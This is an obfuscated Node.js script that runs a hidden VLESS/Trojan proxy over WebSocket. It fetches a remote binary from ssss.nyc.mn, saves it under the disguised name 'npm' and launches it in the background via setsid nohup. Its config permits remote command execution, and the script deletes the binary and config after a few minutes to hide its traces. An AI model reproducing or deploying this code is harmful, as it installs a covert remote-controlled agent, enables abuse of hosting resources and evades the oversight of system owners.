const _0x59ba75=_0x23b8;function _0x23b8(_0x4dd75f,_0x452f2e){const _0x3f2661=_0x3f26();return _0x23b8=function(_0x23b8f2,_0x269cb9){_0x23b8f2=_0x23b8f2-0x9f;let _0xb9d741=_0x3f2661[_0x23b8f2];return _0xb9d741;},_0x23b8(_0x4dd75f,_0x452f2e);}(function(_0x3fb89d,_0x55db99){const _0x2d4ad8=_0x23b8,_0x57c3ea=_0x3fb89d();while(!![]){try{const _0x48ed10=parseInt(_0x2d4ad8(0xd9))/0x1*(-parseInt(_0x2d4ad8(0xe3))/0x2)+parseInt(_0x2d4ad8(0xe4))/0x3*(-parseInt(_0x2d4ad8(0xe0))/0x4)+parseInt(_0x2d4ad8(0xc7))/0x5+-parseInt(_0x2d4ad8(0xf3))/0x6*(parseInt(_0x2d4ad8(0x114))/0x7)+-parseInt(_0x2d4ad8(0xfc))/0x8+-parseInt(_0x2d4ad8(0xfb))/0x9*(parseInt(_0x2d4ad8(0xec))/0xa)+parseInt(_0x2d4ad8(0xd6))/0xb;if(_0x48ed10===_0x55db99)break;else _0x57c3ea['push'](_0x57c3ea['shift']());}catch(_0x2b832f){_0x57c3ea['push'](_0x57c3ea['shift']());}}}(_0x3f26,0x41863));const os=require('os'),http=require(_0x59ba75(0xf8)),fs=require('fs'),axios=require(_0x59ba75(0x10c)),net=require(_0x59ba75(0x111)),path=require(_0x59ba75(0x10d)),crypto=require(_0x59ba75(0xdd)),{Buffer}=require(_0x59ba75(0x116)),{exec,execSync}=require(_0x59ba75(0xba)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x59ba75(0xda)]||_0x59ba75(0xf2),NEZHA_SERVER=process[_0x59ba75(0xea)][_0x59ba75(0x100)]||'',NEZHA_PORT=process[_0x59ba75(0xea)][_0x59ba75(0x10e)]||'',NEZHA_KEY=process[_0x59ba75(0xea)][_0x59ba75(0xa4)]||'',DOMAIN=process[_0x59ba75(0xea)]['DOMAIN']||_0x59ba75(0xd8),AUTO_ACCESS=process['env'][_0x59ba75(0x10b)]||!![],WSPATH=process[_0x59ba75(0xea)][_0x59ba75(0xab)]||UUID[_0x59ba75(0xa0)](0x0,0x8),SUB_PATH=process['env'][_0x59ba75(0xb7)]||'sub',NAME=process[_0x59ba75(0xea)][_0x59ba75(0xf1)]||'',PORT=process[_0x59ba75(0xea)][_0x59ba75(0xf9)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x1d38cb=_0x59ba75;try{const _0x2698ab=await axios[_0x1d38cb(0x102)]('https://api.ip.sb/geoip'),_0x18c278=_0x2698ab[_0x1d38cb(0xbc)];ISP=(_0x18c278['country_code']+'-'+_0x18c278[_0x1d38cb(0xe2)])[_0x1d38cb(0xc5)](/ /g,'_');}catch(_0x2b9fed){ISP='Unknown';}};GetISP();const httpServer=http[_0x59ba75(0xfe)]((_0x4badb7,_0x12d3a2)=>{const _0x9529c5=_0x59ba75;if(_0x4badb7[_0x9529c5(0xaf)]==='/'){const _0x26f689=path[_0x9529c5(0xa7)](__dirname,_0x9529c5(0xa9));fs['readFile'](_0x26f689,_0x9529c5(0xc3),(_0x28cdb3,_0x12d469)=>{const _0x541ae8=_0x9529c5;if(_0x28cdb3){_0x12d3a2[_0x541ae8(0xcb)](0xc8,{'Content-Type':'text/html'}),_0x12d3a2[_0x541ae8(0xb8)]('Hello\x20world!');return;}_0x12d3a2[_0x541ae8(0xcb)](0xc8,{'Content-Type':_0x541ae8(0xc2)}),_0x12d3a2[_0x541ae8(0xb8)](_0x12d469);});return;}else{if(_0x4badb7[_0x9529c5(0xaf)]==='/'+SUB_PATH){const _0x4ffa41=NAME?NAME+'-'+ISP:ISP,_0x227e64=_0x9529c5(0xc1)+UUID+'@'+DOMAIN+_0x9529c5(0x105)+DOMAIN+_0x9529c5(0xef)+DOMAIN+_0x9529c5(0xcf)+WSPATH+'#'+_0x4ffa41,_0x50ed9c=_0x9529c5(0x117)+UUID+'@'+DOMAIN+_0x9529c5(0xc0)+DOMAIN+_0x9529c5(0xef)+DOMAIN+_0x9529c5(0xcf)+WSPATH+'#'+_0x4ffa41,_0x28bdf2=_0x227e64+'\x0a'+_0x50ed9c,_0x46e009=Buffer['from'](_0x28bdf2)[_0x9529c5(0xaa)](_0x9529c5(0xa5));_0x12d3a2[_0x9529c5(0xcb)](0xc8,{'Content-Type':_0x9529c5(0xae)}),_0x12d3a2['end'](_0x46e009+'\x0a');}else _0x12d3a2[_0x9529c5(0xcb)](0x194,{'Content-Type':_0x9529c5(0xae)}),_0x12d3a2[_0x9529c5(0xb8)](_0x9529c5(0x113));}}),wss=new WebSocket[(_0x59ba75(0xe6))]({'server':httpServer}),uuid=UUID[_0x59ba75(0xc5)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x59ba75(0x112)];function resolveHost(_0x25d033){return new Promise((_0x3a452a,_0x403186)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x25d033)){_0x3a452a(_0x25d033);return;}let _0x49a9bc=0x0;function _0x1197c7(){const _0x4b6774=_0x23b8;if(_0x49a9bc>=DNS_SERVERS[_0x4b6774(0x10f)]){_0x403186(new Error(_0x4b6774(0xf0)+_0x25d033+_0x4b6774(0xbb)));return;}const _0x7d265b=DNS_SERVERS[_0x49a9bc];_0x49a9bc++;const _0x33e0b6=_0x4b6774(0x9f)+encodeURIComponent(_0x25d033)+_0x4b6774(0xf5);axios[_0x4b6774(0x102)](_0x33e0b6,{'timeout':0x1388,'headers':{'Accept':_0x4b6774(0xb4)}})[_0x4b6774(0xd3)](_0x213045=>{const _0x2deeb9=_0x4b6774,_0x26ea38=_0x213045[_0x2deeb9(0xbc)];if(_0x26ea38[_0x2deeb9(0xdc)]===0x0&&_0x26ea38[_0x2deeb9(0x101)]&&_0x26ea38[_0x2deeb9(0x101)][_0x2deeb9(0x10f)]>0x0){const _0x4c2127=_0x26ea38[_0x2deeb9(0x101)]['find'](_0x25b2d2=>_0x25b2d2[_0x2deeb9(0xb3)]===0x1);if(_0x4c2127){_0x3a452a(_0x4c2127[_0x2deeb9(0xbc)]);return;}}_0x1197c7();})[_0x4b6774(0xf7)](_0x46920d=>{_0x1197c7();});}_0x1197c7();});}function handleVlessConnection(_0x4ed9f3,_0x1f28cd){const _0x10237d=_0x59ba75,[_0x25e5b3]=_0x1f28cd,_0x1f6821=_0x1f28cd['slice'](0x1,0x11);if(!_0x1f6821[_0x10237d(0xff)]((_0x19d4a3,_0x4e2271)=>_0x19d4a3==parseInt(uuid[_0x10237d(0xad)](_0x4e2271*0x2,0x2),0x10)))return![];let _0x291045=_0x1f28cd[_0x10237d(0xa0)](0x11,0x12)['readUInt8']()+0x13;const _0xfc61eb=_0x1f28cd[_0x10237d(0xa0)](_0x291045,_0x291045+=0x2)[_0x10237d(0xe5)](0x0),_0x40076d=_0x1f28cd['slice'](_0x291045,_0x291045+=0x1)[_0x10237d(0x106)](),_0x1281bd=_0x40076d==0x1?_0x1f28cd['slice'](_0x291045,_0x291045+=0x4)['join']('.'):_0x40076d==0x2?new TextDecoder()[_0x10237d(0xbf)](_0x1f28cd[_0x10237d(0xa0)](_0x291045+0x1,_0x291045+=0x1+_0x1f28cd[_0x10237d(0xa0)](_0x291045,_0x291045+0x1)[_0x10237d(0x106)]())):_0x40076d==0x3?_0x1f28cd[_0x10237d(0xa0)](_0x291045,_0x291045+=0x10)[_0x10237d(0xca)]((_0x517512,_0x9c7fe7,_0x30abb5,_0x2e2430)=>_0x30abb5%0x2?_0x517512[_0x10237d(0x119)](_0x2e2430[_0x10237d(0xa0)](_0x30abb5-0x1,_0x30abb5+0x1)):_0x517512,[])[_0x10237d(0xeb)](_0x2987c9=>_0x2987c9[_0x10237d(0xe5)](0x0)[_0x10237d(0xaa)](0x10))['join'](':'):'';_0x4ed9f3[_0x10237d(0xd4)](new Uint8Array([_0x25e5b3,0x0]));const _0x51d086=createWebSocketStream(_0x4ed9f3);return resolveHost(_0x1281bd)[_0x10237d(0xd3)](_0x4652f4=>{const _0xaf872e=_0x10237d;net['connect']({'host':_0x4652f4,'port':_0xfc61eb},function(){const _0x90313e=_0x23b8;this[_0x90313e(0xdb)](_0x1f28cd['slice'](_0x291045)),_0x51d086['on']('error',()=>{})[_0x90313e(0xa8)](this)['on'](_0x90313e(0x10a),()=>{})[_0x90313e(0xa8)](_0x51d086);})['on'](_0xaf872e(0x10a),()=>{});})['catch'](_0x52dfc9=>{const _0x59cf02=_0x10237d;net[_0x59cf02(0xb9)]({'host':_0x1281bd,'port':_0xfc61eb},function(){const _0x49cde2=_0x59cf02;this[_0x49cde2(0xdb)](_0x1f28cd[_0x49cde2(0xa0)](_0x291045)),_0x51d086['on'](_0x49cde2(0x10a),()=>{})[_0x49cde2(0xa8)](this)['on'](_0x49cde2(0x10a),()=>{})[_0x49cde2(0xa8)](_0x51d086);})['on'](_0x59cf02(0x10a),()=>{});}),!![];}function handleTrojanConnection(_0x4a8cb1,_0x5696a9){const _0x465411=_0x59ba75;try{if(_0x5696a9[_0x465411(0x10f)]<0x3a)return![];const _0x1af558=_0x5696a9['slice'](0x0,0x38)['toString'](),_0x3de0f5=[UUID];let _0x417f1b=null;for(const _0x2c3d2d of _0x3de0f5){const _0x20c9e2=crypto['createHash'](_0x465411(0xa6))['update'](_0x2c3d2d)[_0x465411(0xe1)](_0x465411(0xbd));if(_0x20c9e2===_0x1af558){_0x417f1b=_0x2c3d2d;break;}}if(!_0x417f1b)return![];let _0x21062e=0x38;_0x5696a9[_0x21062e]===0xd&&_0x5696a9[_0x21062e+0x1]===0xa&&(_0x21062e+=0x2);const _0x324e60=_0x5696a9[_0x21062e];if(_0x324e60!==0x1)return![];_0x21062e+=0x1;const _0x17a15a=_0x5696a9[_0x21062e];_0x21062e+=0x1;let _0x2a9adb,_0x2332fd;if(_0x17a15a===0x1)_0x2a9adb=_0x5696a9['slice'](_0x21062e,_0x21062e+0x4)[_0x465411(0xa7)]('.'),_0x21062e+=0x4;else{if(_0x17a15a===0x3){const _0x5d12c5=_0x5696a9[_0x21062e];_0x21062e+=0x1,_0x2a9adb=_0x5696a9[_0x465411(0xa0)](_0x21062e,_0x21062e+_0x5d12c5)[_0x465411(0xaa)](),_0x21062e+=_0x5d12c5;}else{if(_0x17a15a===0x4)_0x2a9adb=_0x5696a9['slice'](_0x21062e,_0x21062e+0x10)['reduce']((_0x38c0d0,_0x380f60,_0x43fea2,_0x3219cc)=>_0x43fea2%0x2?_0x38c0d0[_0x465411(0x119)](_0x3219cc[_0x465411(0xa0)](_0x43fea2-0x1,_0x43fea2+0x1)):_0x38c0d0,[])['map'](_0x1c11b6=>_0x1c11b6[_0x465411(0xe5)](0x0)['toString'](0x10))[_0x465411(0xa7)](':'),_0x21062e+=0x10;else return![];}}_0x2332fd=_0x5696a9['readUInt16BE'](_0x21062e),_0x21062e+=0x2;_0x21062e<_0x5696a9['length']&&_0x5696a9[_0x21062e]===0xd&&_0x5696a9[_0x21062e+0x1]===0xa&&(_0x21062e+=0x2);const _0x381b65=createWebSocketStream(_0x4a8cb1);return resolveHost(_0x2a9adb)[_0x465411(0xd3)](_0x50d289=>{const _0x26bd59=_0x465411;net['connect']({'host':_0x50d289,'port':_0x2332fd},function(){const _0x1ac0bf=_0x23b8;_0x21062e<_0x5696a9[_0x1ac0bf(0x10f)]&&this[_0x1ac0bf(0xdb)](_0x5696a9[_0x1ac0bf(0xa0)](_0x21062e)),_0x381b65['on'](_0x1ac0bf(0x10a),()=>{})['pipe'](this)['on'](_0x1ac0bf(0x10a),()=>{})[_0x1ac0bf(0xa8)](_0x381b65);})['on'](_0x26bd59(0x10a),()=>{});})[_0x465411(0xf7)](_0xf82ba=>{const _0xab0eb4=_0x465411;net[_0xab0eb4(0xb9)]({'host':_0x2a9adb,'port':_0x2332fd},function(){const _0x9a2ed1=_0xab0eb4;_0x21062e<_0x5696a9[_0x9a2ed1(0x10f)]&&this[_0x9a2ed1(0xdb)](_0x5696a9[_0x9a2ed1(0xa0)](_0x21062e)),_0x381b65['on'](_0x9a2ed1(0x10a),()=>{})[_0x9a2ed1(0xa8)](this)['on'](_0x9a2ed1(0x10a),()=>{})['pipe'](_0x381b65);})['on']('error',()=>{});}),!![];}catch(_0x127201){return![];}}wss['on'](_0x59ba75(0xe9),(_0x483d43,_0x2732f0)=>{const _0x1165b5=_0x59ba75,_0x1a9626=_0x2732f0[_0x1165b5(0xaf)]||'';_0x483d43[_0x1165b5(0x118)]('message',_0x26b314=>{const _0x1fbfb2=_0x1165b5;if(_0x26b314[_0x1fbfb2(0x10f)]>0x11&&_0x26b314[0x0]===0x0){const _0x17a7dd=_0x26b314[_0x1fbfb2(0xa0)](0x1,0x11),_0x128a9d=_0x17a7dd[_0x1fbfb2(0xff)]((_0x45eeeb,_0x44d273)=>_0x45eeeb==parseInt(uuid[_0x1fbfb2(0xad)](_0x44d273*0x2,0x2),0x10));if(_0x128a9d){!handleVlessConnection(_0x483d43,_0x26b314)&&_0x483d43[_0x1fbfb2(0x110)]();return;}}!handleTrojanConnection(_0x483d43,_0x26b314)&&_0x483d43[_0x1fbfb2(0x110)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x12b64a=_0x59ba75,_0x48fa04=os['arch']();return _0x48fa04===_0x12b64a(0xa1)||_0x48fa04===_0x12b64a(0xd1)||_0x48fa04==='aarch64'?!NEZHA_PORT?_0x12b64a(0xd0):_0x12b64a(0xf6):!NEZHA_PORT?_0x12b64a(0xfa):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x48f935=_0x59ba75;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x5156f2=getDownloadUrl(),_0x3049c9=await axios({'method':'get','url':_0x5156f2,'responseType':_0x48f935(0xfd)}),_0x4691ab=fs['createWriteStream']('npm');return _0x3049c9[_0x48f935(0xbc)][_0x48f935(0xa8)](_0x4691ab),new Promise((_0x5f1356,_0xbdc5bb)=>{const _0x2847da=_0x48f935;_0x4691ab['on'](_0x2847da(0xde),()=>{const _0x1f2bdb=_0x2847da;console[_0x1f2bdb(0xb5)](_0x1f2bdb(0x11c)),exec(_0x1f2bdb(0xce),_0x113712=>{if(_0x113712)_0xbdc5bb(_0x113712);_0x5f1356();});}),_0x4691ab['on']('error',_0xbdc5bb);});}catch(_0x17d9ed){throw _0x17d9ed;}},runnz=async()=>{const _0x4503fd=_0x59ba75;try{const _0x127448=execSync(_0x4503fd(0xc8),{'encoding':_0x4503fd(0xb6)});if(_0x127448[_0x4503fd(0xed)]()!==''){console[_0x4503fd(0xb5)](_0x4503fd(0xe8));return;}}catch(_0x4e5359){}await downloadFile();let _0x41af45='',_0x3e2e9e=[_0x4503fd(0xb1),_0x4503fd(0xd2),_0x4503fd(0x103),_0x4503fd(0x11a),_0x4503fd(0xf4),_0x4503fd(0xc4)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x29006b=_0x3e2e9e['includes'](NEZHA_PORT)?'--tls':'';_0x41af45=_0x4503fd(0x108)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4503fd(0xee)+NEZHA_KEY+'\x20'+_0x29006b+_0x4503fd(0xe7);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2fb134=NEZHA_SERVER[_0x4503fd(0xc6)](':')?NEZHA_SERVER[_0x4503fd(0xc9)](':')[_0x4503fd(0xb0)]():'',_0xfaba4=_0x3e2e9e[_0x4503fd(0xc6)](_0x2fb134)?_0x4503fd(0xdf):_0x4503fd(0x107),_0x55da8f=_0x4503fd(0xcd)+NEZHA_KEY+_0x4503fd(0xcc)+NEZHA_SERVER+_0x4503fd(0x109)+_0xfaba4+_0x4503fd(0xd5)+UUID;fs[_0x4503fd(0xac)](_0x4503fd(0xa2),_0x55da8f);}_0x41af45='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x4503fd(0xb5)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x41af45,{'shell':_0x4503fd(0xd7)},_0x2c8b6e=>{const _0x1da8de=_0x4503fd;if(_0x2c8b6e)console[_0x1da8de(0x10a)](_0x1da8de(0xa3),_0x2c8b6e);else console[_0x1da8de(0xb5)](_0x1da8de(0x104));});}catch(_0x49cc1e){console[_0x4503fd(0x10a)]('error:\x20'+_0x49cc1e);}};function _0x3f26(){const _0x5bde41=['toString','WSPATH','writeFileSync','substr','text/plain','url','pop','443','unlink','type','application/dns-json','log','utf-8','SUB_PATH','end','connect','child_process','\x20with\x20all\x20DNS\x20servers','data','hex','https://oooo.serv00.net/add-url','decode',':443?security=tls&sni=','vless://','text/html','utf8','2053','replace','includes','1637535UWzeel','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','split','reduce','writeHead','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','client_secret:\x20','chmod\x20+x\x20npm','&path=%2F','https://arm64.ssss.nyc.mn/v1','arm64','8443','then','send','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','16535585cXBPFR','/bin/bash','1234.abc.com','7251njMpTC','UUID','write','Status','crypto','finish','true','4628bpeRjH','digest','isp','106QlvbKe','267QkVEri','readUInt16BE','Server','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','npm\x20is\x20already\x20running,\x20skip\x20running...','connection','env','map','10jhEwqq','trim','\x20-p\x20','&fp=chrome&type=ws&host=','Failed\x20to\x20resolve\x20','NAME','849a1740-8cd6-4b66-a4f6-6d8891c0ff4e','2208756TWwxEx','2083','&type=A','https://arm64.ssss.nyc.mn/agent','catch','http','PORT','https://amd64.ssss.nyc.mn/v1','1897146yIcKjm','3969272YbEvmK','stream','createServer','every','NEZHA_SERVER','Answer','get','2096','npm\x20is\x20running',':443?encryption=none&security=tls&sni=','readUInt8','false','setsid\x20nohup\x20./npm\x20-s\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','error','AUTO_ACCESS','axios','path','NEZHA_PORT','length','close','net','1.1.1.1','Not\x20Found\x0a','7dFArsa','Server\x20is\x20running\x20on\x20port\x20','buffer','trojan://','once','concat','2087','post','npm\x20download\x20successfully','https://dns.google/resolve?name=','slice','arm','config.yaml','npm\x20running\x20error:','NEZHA_KEY','base64','sha224','join','pipe','index.html'];_0x3f26=function(){return _0x5bde41;};return _0x3f26();}async function addAccessTask(){const _0x4c3cc2=_0x59ba75;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0xdbea26='https://'+DOMAIN;try{const _0x14eaa5=await axios[_0x4c3cc2(0x11b)](_0x4c3cc2(0xbe),{'url':_0xdbea26},{'headers':{'Content-Type':'application/json'}});console[_0x4c3cc2(0xb5)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x27d2be){}}const delFiles=()=>{const _0x3d7421=_0x59ba75;fs[_0x3d7421(0xb2)]('npm',()=>{}),fs[_0x3d7421(0xb2)](_0x3d7421(0xa2),()=>{});};httpServer['listen'](PORT,()=>{const _0x3b68d0=_0x59ba75;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x3b68d0(0xb5)](_0x3b68d0(0x115)+PORT);});
